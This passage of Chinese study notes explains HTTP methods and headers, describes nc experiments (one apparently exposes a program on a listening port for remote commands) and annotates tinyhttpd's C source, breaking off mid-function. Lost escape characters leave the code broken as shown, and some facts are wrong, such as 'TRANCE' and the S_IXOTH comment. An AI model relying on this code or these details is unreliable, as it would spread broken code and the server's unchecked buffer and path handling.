/><h3>根据产品及其应用程序界面的不同，测试用例也会有所不同。</h3></div><div class='page'><h1 class='title level-3'>http协议</h1><br/><a href=""><img src="images\285-1.png" alt="images\285-1.png" /></a><br /><br /><a href=""><img src="images\285-2.png" alt="images\285-2.png" /></a><br /><br /><strong><h3>http常见请求方法</h3></strong><br />1、GET：请求指定页面信息，并返回实体主体； <br />2、POST：向指定资源提交数据并进行处理请求，数据被包含在请求体中，POST请求可能会导致新的资源的建立或已有资源的修改；<br />3、HEAD：类似GET请求，只不过返回的响应中没有具体内容，用于获取报头；<br />4、PUT：从客服端向服务器传送的数据取代指定的文档内容；<br />5、DELETE：请求服务器删除指定的内容；<br />6、CONNECT：HTTP1.1协议中预留给能够将连接改为管道方式的代理服务器； <br />7、TRANCE：回显服务器收到的请求，主要用于测试或诊断；<br /><br /><strong><h3>http常见header</h3></strong>（报文头）<br />Host: www.test.com/ //请求的目标域名和端口号<br /> Origin: http://localhost:8081/ //请求的来源域名和端口号 （跨域请求时，浏览器会自动带上这个头信息）<br /> Referer: https:/localhost:8081/link?query=xxxxx //请求资源的完整URI<br /> User-Agent //浏览器信息<br /> Cookie: //当前域名下的Cookie<br /> Accept: text/html,image/apng //代表客户端希望接受的数据类型是html或者是png图片类型<br /> Accept-Encoding: gzip, deflate //代表客户端能支持gzip和deflate格式的压缩<br /> Accept-Language: zh-CN,zh;q=0.9 //代表客户端可以支持语言zh-CN或者zh<br /> Connection: keep-alive //告诉服务器，客户端需要的tcp连接是一个长连接<br /> If-None-Match //如果内容未改变返回304代码，对应Etag<br /> If-Modified-Since //对应last-midified，未被修改则返回304代码<br /> Date: //服务端发送资源时的服务器时间<br /> Expires: //缓存过期时间<br /> Cache-Control: no-cache // 缓存方式<br /> Etag // 文件内容hash<br /> Last-Modified //最近一次文件修改时间<br /> Content-Type: text/html; charset=utf-8 //编码格式<br /> Content-Encoding: gzip //采用gzip对资源进行解码<br /> Connection: keep-alive //tcp是长连接<br /> Set-Cookie //设置Http Cookie</div><div class='page'><h1 class='title level-3'>tinyhttpd源码分析</h1><br/><br /></div><div class='page'><h1 class='title level-4'>nc查看HTTP包请求</h1><br/>监听本地8899端口<br /><a href=""><img src="images\287-1.png" alt="images\287-1.png" /></a><br />nc连接本地8899端口，建立连接后，两者可以互发消息<br /><a href=""><img src="images\287-2.png" alt="images\287-2.png" /></a><br /><br />监听本地8899端口后，通过web访问呢本地8899端口，可以看到浏览器发送的get请求<br /><a href=""><img src="images\287-3.png" alt="images\287-3.png" /></a><br />在监听端口的shell，将http响应包发送回去，浏览器会解析响应<br /><a href=""><img src="images\287-4.png" alt="images\287-4.png" /></a><br /><br /><br />本地监听9999端口，并使用指定程序相应9999端口的请求，注意此时使用了lvvp参数，而非此前lvp<br /><a href=""><img src="images\287-5.png" alt="images\287-5.png" /></a><br />连接9999端口，输入ls，会得到响应	<br /><a href=""><img src="images\287-6.png" alt="images\287-6.png" /></a><br /><br /><br />使用指定脚本响应请求<br /><a href=""><img src="images\287-7.png" alt="images\287-7.png" /></a><br />脚本内容，使用换行符表示http请求结束<br /><a href=""><img src="images\287-8.png" alt="images\287-8.png" /></a><br />访问并得到返回<br /><a href=""><img src="images\287-9.png" alt="images\287-9.png" /></a></div><div class='page'><h1 class='title level-4'>tinyhttpd</h1><br/><a href=""><img src="images\289-1.png" alt="images\289-1.png" /></a><br /><br /><br />编译后执行httpd程序<br /><a href=""><img src="images\289-2.png" alt="images\289-2.png" /></a><br /><br />访问<br /><a href=""><img src="images\289-3.png" alt="images\289-3.png" /></a><br /><br />流程图<br /><a href=""><img src="images\289-4.png" alt="images\289-4.png" /></a><br />源码<br /><br /><div class="codebox"><div class="codebox"><span style="color:#0088ff;font-weight:400">/*&nbsp;J.&nbsp;David&#39;s&nbsp;webserver&nbsp;*/</span><br /><span style="color:#0088ff;font-weight:400">/*&nbsp;This&nbsp;is&nbsp;a&nbsp;simple&nbsp;webserver.<br />&nbsp;*&nbsp;Created&nbsp;November&nbsp;1999&nbsp;by&nbsp;J.&nbsp;David&nbsp;Blackstone.<br />&nbsp;*&nbsp;CSE&nbsp;4344&nbsp;(Network&nbsp;concepts),&nbsp;Prof.&nbsp;Zeigler<br />&nbsp;*&nbsp;University&nbsp;of&nbsp;Texas&nbsp;at&nbsp;Arlington<br />&nbsp;*/</span><br /><span style="color:#0088ff;font-weight:400">/*&nbsp;This&nbsp;program&nbsp;compiles&nbsp;for&nbsp;Sparc&nbsp;Solaris&nbsp;2.6.<br />&nbsp;*&nbsp;To&nbsp;compile&nbsp;for&nbsp;Linux:<br />&nbsp;*&nbsp;&nbsp;1)&nbsp;Comment&nbsp;out&nbsp;the&nbsp;#include&nbsp;&lt;pthread.h&gt;&nbsp;line.<br />&nbsp;*&nbsp;&nbsp;2)&nbsp;Comment&nbsp;out&nbsp;the&nbsp;line&nbsp;that&nbsp;defines&nbsp;the&nbsp;variable&nbsp;newthread.<br />&nbsp;*&nbsp;&nbsp;3)&nbsp;Comment&nbsp;out&nbsp;the&nbsp;two&nbsp;lines&nbsp;that&nbsp;run&nbsp;pthread_create().<br />&nbsp;*&nbsp;&nbsp;4)&nbsp;Uncomment&nbsp;the&nbsp;line&nbsp;that&nbsp;runs&nbsp;accept_request().<br />&nbsp;*&nbsp;&nbsp;5)&nbsp;Remove&nbsp;-lsocket&nbsp;from&nbsp;the&nbsp;Makefile.<br />&nbsp;*/</span><br /><span style="color:#7f0044;font-weight:700">#include&nbsp;&lt;stdio.h&gt;</span><br /><span style="color:#7f0044;font-weight:700">#include&nbsp;&lt;sys/socket.h&gt;</span><br /><span style="color:#7f0044;font-weight:700">#include&nbsp;&lt;sys/types.h&gt;</span><br /><span style="color:#7f0044;font-weight:700">#include&nbsp;&lt;netinet/in.h&gt;</span><br /><span style="color:#7f0044;font-weight:700">#include&nbsp;&lt;arpa/inet.h&gt;</span><br /><span style="color:#7f0044;font-weight:700">#include&nbsp;&lt;unistd.h&gt;</span><br /><span style="color:#7f0044;font-weight:700">#include&nbsp;&lt;ctype.h&gt;</span><br /><span style="color:#7f0044;font-weight:700">#include&nbsp;&lt;strings.h&gt;</span><br /><span style="color:#7f0044;font-weight:700">#include&nbsp;&lt;string.h&gt;</span><br /><span style="color:#7f0044;font-weight:700">#include&nbsp;&lt;sys/stat.h&gt;</span><br /><span style="color:#7f0044;font-weight:700">#include&nbsp;&lt;pthread.h&gt;</span><br /><span style="color:#7f0044;font-weight:700">#include&nbsp;&lt;sys/wait.h&gt;</span><br /><span style="color:#7f0044;font-weight:700">#include&nbsp;&lt;stdlib.h&gt;</span><br />&nbsp;<br /><span style="color:#7f0044;font-weight:700">#define&nbsp;ISspace(x)&nbsp;isspace((int)(x))</span><br /><span style="color:#0088ff;font-weight:400">//函数说明：检查参数c是否为空格字符，</span><br /><span style="color:#0088ff;font-weight:400">//也就是判断是否为空格(&#39;&nbsp;&#39;)、定位字符(&#39;&nbsp;t&nbsp;&#39;)、CR(&#39;&nbsp;r&nbsp;&#39;)、换行(&#39;&nbsp;n&nbsp;&#39;)、垂直定位字符(&#39;&nbsp;v&nbsp;&#39;)或翻页(&#39;&nbsp;f&nbsp;&#39;)的情况。</span><br /><span style="color:#0088ff;font-weight:400">//返回值：若参数c&nbsp;为空白字符，则返回非&nbsp;0，否则返回&nbsp;0。</span><br />&nbsp;<br />&nbsp;<br /><span style="color:#7f0044;font-weight:700">#define&nbsp;SERVER_STRING&nbsp;&quot;Server:&nbsp;jdbhttpd/0.1.0rn&quot;//定义server名称</span><br />&nbsp;<br /><span style="color:#7f0044;font-weight:400">void</span>&nbsp;accept_request(<span style="color:#7f0044;font-weight:400">int</span>);<span style="color:#0088ff;font-weight:400">//接收请求</span><br />&nbsp;<br /><span style="color:#7f0044;font-weight:400">void</span>&nbsp;bad_request(<span style="color:#7f0044;font-weight:400">int</span>);<span style="color:#0088ff;font-weight:400">//无效请求</span><br /><span style="color:#7f0044;font-weight:400">void</span>&nbsp;cat(<span style="color:#7f0044;font-weight:400">int</span>,&nbsp;FILE&nbsp;*);<br /><span style="color:#7f0044;font-weight:400">void</span>&nbsp;cannot_execute(<span style="color:#7f0044;font-weight:400">int</span>);<br /><span style="color:#7f0044;font-weight:400">void</span>&nbsp;error_die(<span style="color:#7f0044;font-weight:400">const</span>&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;*);<br /><span style="color:#7f0044;font-weight:400">void</span>&nbsp;execute_cgi(<span style="color:#7f0044;font-weight:400">int</span>,&nbsp;<span style="color:#7f0044;font-weight:400">const</span>&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;*,&nbsp;<span style="color:#7f0044;font-weight:400">const</span>&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;*,&nbsp;<span style="color:#7f0044;font-weight:400">const</span>&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;*);<br /><span style="color:#7f0044;font-weight:400">int</span>&nbsp;get_line(<span style="color:#7f0044;font-weight:400">int</span>,&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;*,&nbsp;<span style="color:#7f0044;font-weight:400">int</span>);<br /><span style="color:#7f0044;font-weight:400">void</span>&nbsp;headers(<span style="color:#7f0044;font-weight:400">int</span>,&nbsp;<span style="color:#7f0044;font-weight:400">const</span>&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;*);<br /><span style="color:#7f0044;font-weight:400">void</span>&nbsp;not_found(<span style="color:#7f0044;font-weight:400">int</span>);<br /><span style="color:#7f0044;font-weight:400">void</span>&nbsp;serve_file(<span style="color:#7f0044;font-weight:400">int</span>,&nbsp;<span style="color:#7f0044;font-weight:400">const</span>&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;*);<br /><span style="color:#7f0044;font-weight:400">int</span>&nbsp;startup(u_short&nbsp;*);<br /><span style="color:#7f0044;font-weight:400">void</span>&nbsp;unimplemented(<span style="color:#7f0044;font-weight:400">int</span>);<br />&nbsp;<br /><span style="color:#0088ff;font-weight:400">/**********************************************************************/</span><br /><span style="color:#0088ff;font-weight:400">/*&nbsp;A&nbsp;request&nbsp;has&nbsp;caused&nbsp;a&nbsp;call&nbsp;to&nbsp;accept()&nbsp;on&nbsp;the&nbsp;server&nbsp;port&nbsp;to<br />&nbsp;*&nbsp;return.&nbsp;&nbsp;Process&nbsp;the&nbsp;request&nbsp;appropriately.<br />&nbsp;*&nbsp;Parameters:&nbsp;the&nbsp;socket&nbsp;connected&nbsp;to&nbsp;the&nbsp;client&nbsp;*/</span><br /><span style="color:#0088ff;font-weight:400">/**********************************************************************/</span><br /><span style="color:#0088ff;font-weight:400">//接收客户端的连接，并读取请求数据</span><br /><span style="color:#7f0044;font-weight:400">void</span>&nbsp;accept_request(<span style="color:#7f0044;font-weight:400">int</span>&nbsp;client)<br />{<br />&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;buf[<span style="color:#ff0044;font-weight:400">1024</span>];<br />&nbsp;<span style="color:#7f0044;font-weight:400">int</span>&nbsp;numchars;<br />&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;method[<span style="color:#ff0044;font-weight:400">255</span>];<br />&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;url[<span style="color:#ff0044;font-weight:400">255</span>];<br />&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;path[<span style="color:#ff0044;font-weight:400">512</span>];<br />&nbsp;<span style="color:#7f0044;font-weight:400">size_t</span>&nbsp;i,&nbsp;j;<br />&nbsp;<span style="color:#ff9d00;font-weight:700">struct</span>&nbsp;stat&nbsp;st;<br />&nbsp;<span style="color:#7f0044;font-weight:400">int</span>&nbsp;cgi&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;becomes&nbsp;true&nbsp;if&nbsp;server&nbsp;decides&nbsp;this&nbsp;is&nbsp;a&nbsp;CGI<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;program&nbsp;*/</span><br />&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;*query_string&nbsp;=&nbsp;<span style="color:#0088ff;font-weight:700">NULL</span>;<br /><span style="color:#0088ff;font-weight:400">//获取一行HTTP报文数据</span><br />&nbsp;numchars&nbsp;=&nbsp;get_line(client,&nbsp;buf,&nbsp;<span style="color:#ff9d00;font-weight:400">sizeof</span>(buf));<br />&nbsp;<span style="color:#0088ff;font-weight:400">//</span><br />&nbsp;i&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span>;&nbsp;j&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span>;<br />&nbsp;<span style="color:#0088ff;font-weight:400">//对于HTTP报文来说，第一行的内容即为报文的起始行，格式为&lt;method&gt;&nbsp;&lt;request-URL&gt;&nbsp;&lt;version&gt;，</span><br />&nbsp;<span style="color:#0088ff;font-weight:400">//每个字段用空白字符相连</span><br />&nbsp;<span style="color:#ff9d00;font-weight:700">while</span>&nbsp;(!ISspace(buf[j])&nbsp;&amp;&amp;&nbsp;(i&nbsp;&lt;&nbsp;<span style="color:#ff9d00;font-weight:400">sizeof</span>(method)&nbsp;-&nbsp;<span style="color:#ff0044;font-weight:400">1</span>))<br />&nbsp;{<br />&nbsp;<span style="color:#0088ff;font-weight:400">//提取其中的请求方式是GET还是POST</span><br />&nbsp;&nbsp;method[i]&nbsp;=&nbsp;buf[j];<br />&nbsp;&nbsp;i++;&nbsp;j++;<br />&nbsp;}<br />&nbsp;method[i]&nbsp;=&nbsp;&#39;&#39;;<br /><span style="color:#0088ff;font-weight:400">//函数说明：strcasecmp()用来比较参数s1&nbsp;和s2&nbsp;字符串，比较时会自动忽略大小写的差异。</span><br /><span style="color:#0088ff;font-weight:400">//返回值：若参数s1&nbsp;和s2&nbsp;字符串相同则返回0。s1&nbsp;长度大于s2&nbsp;长度则返回大于0&nbsp;的值，s1&nbsp;长度若小于s2&nbsp;长度则返回小于0&nbsp;的值。</span><br />&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(strcasecmp(method,&nbsp;<span style="color:#3ad900;font-weight:400">&quot;GET&quot;</span>)&nbsp;&amp;&amp;&nbsp;strcasecmp(method,&nbsp;<span style="color:#3ad900;font-weight:400">&quot;POST&quot;</span>))<br />&nbsp;{<br />&nbsp;<span style="color:#0088ff;font-weight:400">//tinyhttp仅仅实现了GET和POST</span><br />&nbsp;&nbsp;unimplemented(client);<br />&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">return</span>;<br />&nbsp;}<br /><span style="color:#0088ff;font-weight:400">//cgi为标志位，置1说明开启cgi解析</span><br />&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(strcasecmp(method,&nbsp;<span style="color:#3ad900;font-weight:400">&quot;POST&quot;</span>)&nbsp;==&nbsp;<span style="color:#ff0044;font-weight:400">0</span>)<br /><span style="color:#0088ff;font-weight:400">//如果请求方法为POST，需要cgi解析</span><br />&nbsp;&nbsp;cgi&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">1</span>;<br />&nbsp;<br />&nbsp;i&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span>;<br />&nbsp;<span style="color:#0088ff;font-weight:400">//将method后面的后边的空白字符略过</span><br />&nbsp;<span style="color:#ff9d00;font-weight:700">while</span>&nbsp;(ISspace(buf[j])&nbsp;&amp;&amp;&nbsp;(j&nbsp;&lt;&nbsp;<span style="color:#ff9d00;font-weight:400">sizeof</span>(buf)))<br />&nbsp;&nbsp;j++;<br />&nbsp;<span style="color:#0088ff;font-weight:400">//继续读取request-URL</span><br />&nbsp;<span style="color:#ff9d00;font-weight:700">while</span>&nbsp;(!ISspace(buf[j])&nbsp;&amp;&amp;&nbsp;(i&nbsp;&lt;&nbsp;<span style="color:#ff9d00;font-weight:400">sizeof</span>(url)&nbsp;-&nbsp;<span style="color:#ff0044;font-weight:400">1</span>)&nbsp;&amp;&amp;&nbsp;(j&nbsp;&lt;&nbsp;<span style="color:#ff9d00;font-weight:400">sizeof</span>(buf)))<br />&nbsp;{<br />&nbsp;&nbsp;url[i]&nbsp;=&nbsp;buf[j];<br />&nbsp;&nbsp;i++;&nbsp;j++;<br />&nbsp;}<br />&nbsp;url[i]&nbsp;=&nbsp;&#39;&#39;;<br /><span style="color:#0088ff;font-weight:400">//如果是GET请求，url可能会带有?,有查询参数</span><br />&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(strcasecmp(method,&nbsp;<span style="color:#3ad900;font-weight:400">&quot;GET&quot;</span>)&nbsp;==&nbsp;<span style="color:#ff0044;font-weight:400">0</span>)<br />&nbsp;{<br />&nbsp;&nbsp;query_string&nbsp;=&nbsp;url;<br />&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">while</span>&nbsp;((*query_string&nbsp;!=&nbsp;<span style="color:#00117f;font-weight:400">&#39;?&#39;</span>)&nbsp;&amp;&amp;&nbsp;(*query_string&nbsp;!=&nbsp;&#39;&#39;))<br />&nbsp;&nbsp;&nbsp;query_string++;<br />&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(*query_string&nbsp;==&nbsp;<span style="color:#00117f;font-weight:400">&#39;?&#39;</span>)<br />&nbsp;&nbsp;{<br />&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">//如果带有查询参数，需要执行cgi，解析参数，设置标志位为1</span><br />&nbsp;&nbsp;&nbsp;cgi&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">1</span>;<br />&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">//将解析参数截取下来</span><br />&nbsp;&nbsp;&nbsp;*query_string&nbsp;=&nbsp;&#39;&#39;;<br />&nbsp;&nbsp;&nbsp;query_string++;<br />&nbsp;&nbsp;}<br />&nbsp;}<br /><span style="color:#0088ff;font-weight:400">//以上已经将起始行解析完毕</span><br /><span style="color:#0088ff;font-weight:400">//url中的路径格式化到path</span><br />&nbsp;sprintf(path,&nbsp;<span style="color:#3ad900;font-weight:400">&quot;htdocs%s&quot;</span>,&nbsp;url);<br /><span style="color:#0088ff;font-weight:400">//学习到这里明天继续TODO</span><br /><span style="color:#0088ff;font-weight:400">//如果path只是一个目录，默认设置为首页index.html</span><br />&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(path[strlen(path)&nbsp;-&nbsp;<span style="color:#ff0044;font-weight:400">1</span>]&nbsp;==&nbsp;<span style="color:#00117f;font-weight:400">&#39;/&#39;</span>)<br />&nbsp;&nbsp;strcat(path,&nbsp;<span style="color:#3ad900;font-weight:400">&quot;index.html&quot;</span>);<br />&nbsp;<br />&nbsp;<span style="color:#0088ff;font-weight:400">//函数定义:&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;stat(const&nbsp;char&nbsp;*file_name,&nbsp;struct&nbsp;stat&nbsp;*buf);</span><br />&nbsp;<span style="color:#0088ff;font-weight:400">//函数说明:&nbsp;&nbsp;&nbsp;&nbsp;通过文件名filename获取文件信息，并保存在buf所指的结构体stat中</span><br />&nbsp;<span style="color:#0088ff;font-weight:400">//返回值:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;执行成功则返回0，失败返回-1，错误代码存于errno（需要include&nbsp;&lt;errno.h&gt;）</span><br />&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(stat(path,&nbsp;&amp;st)&nbsp;==&nbsp;-<span style="color:#ff0044;font-weight:400">1</span>)&nbsp;{<br />&nbsp;<span style="color:#0088ff;font-weight:400">//假如访问的网页不存在，则不断的读取剩下的请求头信息，并丢弃即可</span><br />&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">while</span>&nbsp;((numchars&nbsp;&gt;&nbsp;<span style="color:#ff0044;font-weight:400">0</span>)&nbsp;&amp;&amp;&nbsp;strcmp(<span style="color:#3ad900;font-weight:400">&quot;n&quot;</span>,&nbsp;buf))&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;read&nbsp;&amp;&nbsp;discard&nbsp;headers&nbsp;*/</span><br />&nbsp;&nbsp;&nbsp;numchars&nbsp;=&nbsp;get_line(client,&nbsp;buf,&nbsp;<span style="color:#ff9d00;font-weight:400">sizeof</span>(buf));<br />&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">//最后声明网页不存在</span><br />&nbsp;&nbsp;not_found(client);<br />&nbsp;}<br />&nbsp;<span style="color:#ff9d00;font-weight:700">else</span><br />&nbsp;{<br />&nbsp;<span style="color:#0088ff;font-weight:400">//如果访问的网页存在则进行处理</span><br />&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;((st.st_mode&nbsp;&amp;&nbsp;S_IFMT)&nbsp;==&nbsp;S_IFDIR)<span style="color:#0088ff;font-weight:400">//S_IFDIR代表目录</span><br />&nbsp;<span style="color:#0088ff;font-weight:400">//如果路径是个目录，那就将主页进行显示</span><br />&nbsp;&nbsp;&nbsp;strcat(path,&nbsp;<span style="color:#3ad900;font-weight:400">&quot;/index.html&quot;</span>);<br />&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;((st.st_mode&nbsp;&amp;&nbsp;S_IXUSR)&nbsp;||<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(st.st_mode&nbsp;&amp;&nbsp;S_IXGRP)&nbsp;||<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(st.st_mode&nbsp;&amp;&nbsp;S_IXOTH)&nbsp;&nbsp;&nbsp;&nbsp;)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">//S_IXUSR:文件所有者具可执行权限</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">//S_IXGRP:用户组具可执行权限</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">//S_IXOTH:其他用户具可读取权限</span><br />&nbsp;&nbsp;&nbsp;cgi&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">1</span>;<br />&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(!cgi)<br />&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">//将静态文件返回</span><br />&nbsp;&nbsp;&nbsp;serve_file(client,&nbsp;path);<br />&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">else</span><br />&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">//执行cgi动态解析</span><br />&nbsp;&nbsp;&nbsp;execute_cgi(client,&nbsp;path,&nbsp;method,&nbsp;query_string);<br />&nbsp;<br />&nbsp;}<br />&nbsp;<br />&nbsp;close(client);<span style="color:#0088ff;font-weight:400">//因为http是面向无连接的，所以要关闭</span><br />}<br />&nbsp;<br /><span style="color:#0088ff;font-weight:400">/**********************************************************************/</span><br /><span style="color:#0088ff;font-weight:400">/*&nbsp;Inform&nbsp;the&nbsp;client&nbsp;that&nbsp;a&nbsp;request&nbsp;it&nbsp;has&nbsp;made&nbsp;has&nbsp;a&nbsp;problem.<br />&nbsp;*&nbsp;Parameters:&nbsp;client&nbsp;socket&nbsp;*/</span><br /><span style="color:#0088ff;font-weight:400">/**********************************************************************/</span><br /><span style="color:#7f0044;font-weight:400">void</span>&nbsp;bad_request(<span style="color:#7f0044;font-weight:400">int</span>&nbsp;client)<br />{<br />&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;buf[<span style="color:#ff0044;font-weight:400">1024</span>];<br /><span style="color:#0088ff;font-weight:400">//发送400</span><br />&nbsp;sprintf(buf,&nbsp;<span style="color:#3ad900;font-weight:400">&quot;HTTP/1.0&nbsp;400&nbsp;BAD&nbsp;REQUESTrn&quot;</span>);<br />&nbsp;send(client,&nbsp;buf,&nbsp;<span style="color:#ff9d00;font-weight:400">sizeof</span>(buf),&nbsp;<span style="color:#ff0044;font-weight:400">0</span>);<br />&nbsp;sprintf(buf,&nbsp;<span style="color:#3ad900;font-weight:400">&quot;Content-type:&nbsp;text/htmlrn&quot;</span>);<br />&nbsp;send(client,&nbsp;buf,&nbsp;<span style="color:#ff9d00;font-weight:400">sizeof</span>(buf),&nbsp;<span style="color:#ff0044;font-weight:400">0</span>);<br />&nbsp;sprintf(buf,&nbsp;<span style="color:#3ad900;font-weight:400">&quot;rn&quot;</span>);<br />&nbsp;send(client,&nbsp;buf,&nbsp;<span style="color:#ff9d00;font-weight:400">sizeof</span>(buf),&nbsp;<span style="color:#ff0044;font-weight:400">0</span>);<br />&nbsp;sprintf(buf,&nbsp;<span style="color:#3ad900;font-weight:400">&quot;&lt;P&gt;Your&nbsp;browser&nbsp;sent&nbsp;a&nbsp;bad&nbsp;request,&nbsp;&quot;</span>);<br />&nbsp;send(client,&nbsp;buf,&nbsp;<span style="color:#ff9d00;font-weight:400">sizeof</span>(buf),&nbsp;<span style="color:#ff0044;font-weight:400">0</span>);<br />&nbsp;sprintf(buf,&nbsp;<span style="color:#3ad900;font-weight:400">&quot;such&nbsp;as&nbsp;a&nbsp;POST&nbsp;without&nbsp;a&nbsp;Content-Length.rn&quot;</span>);<br />&nbsp;send(client,&nbsp;buf,&nbsp;<span style="color:#ff9d00;font-weight:400">sizeof</span>(buf),&nbsp;<span style="color:#ff0044;font-weight:400">0</span>);<br />}<br />&nbsp;<br /><span style="color:#0088ff;font-weight:400">/**********************************************************************/</span><br /><span style="color:#0088ff;font-weight:400">/*&nbsp;Put&nbsp;the&nbsp;entire&nbsp;contents&nbsp;of&nbsp;a&nbsp;file&nbsp;out&nbsp;on&nbsp;a&nbsp;socket.&nbsp;&nbsp;This&nbsp;function<br />&nbsp;*&nbsp;is&nbsp;named&nbsp;after&nbsp;the&nbsp;UNIX&nbsp;&quot;cat&quot;&nbsp;command,&nbsp;because&nbsp;it&nbsp;might&nbsp;have&nbsp;been<br />&nbsp;*&nbsp;easier&nbsp;just&nbsp;to&nbsp;do&nbsp;something&nbsp;like&nbsp;pipe,&nbsp;fork,&nbsp;and&nbsp;exec(&quot;cat&quot;).<br />&nbsp;*&nbsp;Parameters:&nbsp;the&nbsp;client&nbsp;socket&nbsp;descriptor<br />&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FILE&nbsp;pointer&nbsp;for&nbsp;the&nbsp;file&nbsp;to&nbsp;cat&nbsp;*/</span><br /><span style="color:#0088ff;font-weight:400">/**********************************************************************/</span><br /><span style="color:#7f0044;font-weight:400">void</span>&nbsp;cat(<span style="color:#7f0044;font-weight:400">int</span>&nbsp;client,&nbsp;FILE&nbsp;*resource)<br />{<br /><span style="color:#0088ff;font-weight:400">//发送文件的内容</span><br />&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;buf[<span style="color:#ff0044;font-weight:400">1024</span>];<br /><span style="color:#0088ff;font-weight:400">//读取文件到buf中</span><br />&nbsp;fgets(buf,&nbsp;<span style="color:#ff9d00;font-weight:400">sizeof</span>(buf),&nbsp;resource);<br />&nbsp;<span style="color:#ff9d00;font-weight:700">while</span>&nbsp;(!feof(resource))<span style="color:#0088ff;font-weight:400">//判断文件是否读取到末尾</span><br />&nbsp;{<br />&nbsp;<span style="color:#0088ff;font-weight:400">//读取并发送文件内容</span><br />&nbsp;&nbsp;send(client,&nbsp;buf,&nbsp;strlen(buf),&nbsp;<span style="color:#ff0044;font-weight:400">0</span>);<br />&nbsp;&nbsp;fgets(buf,&nbsp;<span style="color:#ff9d00;font-weight:400">sizeof</span>(buf),&nbsp;resource);<br />&nbsp;}<br />}<br />&nbsp;<br /><span style="color:#0088ff;font-weight:400">/**********************************************************************/</span><br /><span style="color:#0088ff;font-weight:400">/*&nbsp;Inform&nbsp;the&nbsp;client&nbsp;that&nbsp;a&nbsp;CGI&nbsp;script&nbsp;could&nbsp;not&nbsp;be&nbsp;executed.<br />&nbsp;*&nbsp;Parameter:&nbsp;the&nbsp;client&nbsp;socket&nbsp;descriptor.&nbsp;*/</span><br /><span style="color:#0088ff;font-weight:400">/**********************************************************************/</span><br /><span style="color:#7f0044;font-weight:400">void</span>&nbsp;cannot_execute(<span style="color:#7f0044;font-weight:400">int</span>&nbsp;client)<br />{<br />&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;buf[<span style="color:#ff0044;font-weight:400">1024</span>];<br /><span style="color:#0088ff;font-weight:400">//发送500</span><br />&nbsp;sprintf(buf,&nbsp;<span style="color:#3ad900;font-weight:400">&quot;HTTP/1.0&nbsp;500&nbsp;Internal&nbsp;Server&nbsp;Errorrn&quot;</span>);<br />&nbsp;send(client,&nbsp;buf,&nbsp;strlen(buf),&nbsp;<span style="color:#ff0044;font-weight:400">0</span>);<br />&nbsp;sprintf(buf,&nbsp;<span style="color:#3ad900;font-weight:400">&quot;Content-type:&nbsp;text/htmlrn&quot;</span>);<br />&nbsp;send(client,&nbsp;buf,&nbsp;strlen(buf),&nbsp;<span style="color:#ff0044;font-weight:400">0</span>);<br />&nbsp;sprintf(buf,&nbsp;<span style="color:#3ad900;font-weight:400">&quot;rn&quot;</span>);<br />&nbsp;send(client,&nbsp;buf,&nbsp;strlen(buf),&nbsp;<span style="color:#ff0044;font-weight:400">0</span>);<br 